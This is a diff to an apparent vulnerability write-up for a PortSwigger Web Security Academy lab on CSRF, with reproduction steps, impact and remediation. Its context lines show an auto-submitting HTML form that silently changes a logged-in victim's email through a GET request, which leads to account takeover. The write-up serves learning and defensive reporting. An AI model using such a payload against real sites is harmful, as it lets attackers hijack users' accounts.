@@ -11,7 +11,7 @@ A state-changing action (e.g., change email) succeeds without a valid CSRF token
 - Endpoint: `/my-account/change-email`
 - Auth context: logged-in user (wiener)
 - Method: GET (token ignored)
-- Token: present but **not validated for GET**
+- Token present, but ignored for GET; request succeeds without CSRF validation.
 ## Steps to Reproduce
 1) Log in. Find a state-changing action (change email/password/add comment).
 2) Capture request (Burp/DevTools). Confirm token is missing/ignored/static.
@@ -32,7 +32,7 @@ Cache-Control: no-store
 <!doctype html>
 <html>
   <body>
-    <form action="https://0a92000504c64cc580d26c250088004e.web-security-academy.net/my-account/change-email" method="GET">
+    <form action="<lab-host>web-security-academy.net/my-account/change-email" method="GET">
       <input type="hidden" name="email" value="victim%40evil.com">
     </form>
     <script>document.forms[0].submit();</script>
@@ -58,7 +58,7 @@ Body:
 </html>
 
 ## Impact
-A logged-in user’s email address can be changed without their consent, allowing full account takeover via password reset.
+Email change ➜ password reset ➜ potential takeover
 
 ## Recommended Remediation
 - Enforce **per-request, unpredictable CSRF tokens** bound to user/session.
